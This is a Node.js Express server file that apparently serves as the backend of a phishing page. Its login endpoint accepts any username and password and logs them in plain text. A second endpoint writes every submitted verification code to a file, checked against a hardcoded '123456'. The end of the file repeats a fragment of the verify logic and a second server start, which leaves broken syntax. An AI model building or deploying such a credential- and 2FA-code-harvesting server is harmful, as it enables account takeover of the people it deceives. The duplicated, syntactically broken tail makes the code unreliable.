const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import the CORS package
const fs = require('fs'); // Import the File System module

const app = express();
const PORT = process.env.PORT || 3000; // Use the PORT environment variable provided by Render

// Middleware
app.use(bodyParser.json());
app.use(cors()); // Use the CORS middleware to enable CORS

// Endpoint to receive login data
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    // Accept any credentials
    console.log('Received login data:', { username, password });
    res.json({ success: true, message: 'Login successful' });
});

// Endpoint to verify the code
app.post('/api/verify-code', (req, res) => {
    const { code } = req.body;

    // Record the entered code
    fs.appendFile('codes.txt', `Entered code: ${code}\n`, (err) => {
        if (err) {
            console.error('Failed to record the code:', err);
            return res.json({ success: false, message: 'Error recording code' });
        }
        console.log('Code recorded:', code);
    });

    // Placeholder logic for code verification
    if (code === '123456') {
        res.json({ success: true, message: 'Code verified successfully' });
    } else {
        res.json({ success: false, message: 'Invalid code' });
    }
});

// Start server and listen on all network interfaces
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://0.0.0.0:${PORT}`);
});

    // Placeholder logic for code verification
    if (code === '123456') {
        res.json({ success: true, message: 'Code verified successfully' });
    } else {
        res.json({ success: false, message: 'Invalid code' });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
